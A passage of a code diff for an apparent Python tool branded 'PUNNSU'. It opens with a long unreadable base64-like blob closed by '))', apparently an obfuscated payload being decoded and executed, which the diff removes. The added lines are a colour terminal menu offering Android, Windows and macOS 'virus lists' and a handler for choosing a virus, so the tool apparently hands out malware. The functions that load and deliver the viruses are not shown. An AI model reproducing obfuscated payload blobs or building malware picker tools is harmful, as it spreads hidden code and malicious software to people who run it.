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'))
-
+def main():
+    virus_data = load_virus_data()
+    while True:
+        clear()
+        banner()
+        print(f'{C}╔════════════════════════════════════════════════╗{N}')
+        print(f'{C}║{B} [1] Show Android Virus List                  {C}║{N}')
+        print(f'{C}║{B} [2] Show Windows Virus List                  {C}║{N}')
+        print(f'{C}║{B} [3] Show macOS Virus List                    {C}║{N}')
+        print(f'{C}║{R} [0] Exit                                    {C}║{N}')
+        print(f'{C}╚════════════════════════════════════════════════╝{N}')
+        try:
+            choice = int(input(f'{C}PUNNSU {Y}> Enter your choice:{N} '))
+            if choice == 1:
+                show_virus_list("Android", virus_data["anvima"])
+                handle_virus_choice("Android", virus_data["anvima"])
+            elif choice == 2:
+                show_virus_list("Windows", virus_data["winvima"])
+                handle_virus_choice("Windows", virus_data["winvima"])
+            elif choice == 3:
+                show_virus_list("macOS", virus_data["macvima"])
+                handle_virus_choice("macOS", virus_data["macvima"])
+            elif choice == 0:
+                print(f'{Y}[{R}+{Y}] Exiting...{N}')
+                break
+            else:
+                print(f'{C}[{R}!{C}] Invalid choice. Try again.{N}')
+                time.sleep(2)
+        except ValueError:
+            print(f'{C}[{R}!{C}] Invalid input. Please enter a number.{N}')
+            time.sleep(2)
 
 # Jalankan program
 if __name__ == "__main__":
